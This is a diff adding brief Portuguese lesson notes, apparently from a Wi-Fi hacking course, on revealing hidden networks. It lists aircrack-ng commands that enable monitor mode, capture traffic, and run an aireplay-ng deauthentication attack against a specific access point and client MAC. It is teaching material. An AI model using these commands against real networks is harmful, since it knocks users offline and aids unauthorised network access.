@@ -1,0 +1,56 @@
+// Aula 6 - Hackeando Redes Ocultas e clonando MAC Address
+
+# airmon-ng start wlan0
+
+# ifconfig
+
+# airodump-ng wlan0mon -c 10
+
+# aireplay-ng -0 10 -a C0:25:E9:80:C1:50 -c 94:44:44:e7:1b:71 wlan0mon
+
+# airmon-ng stop wlan0mon
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
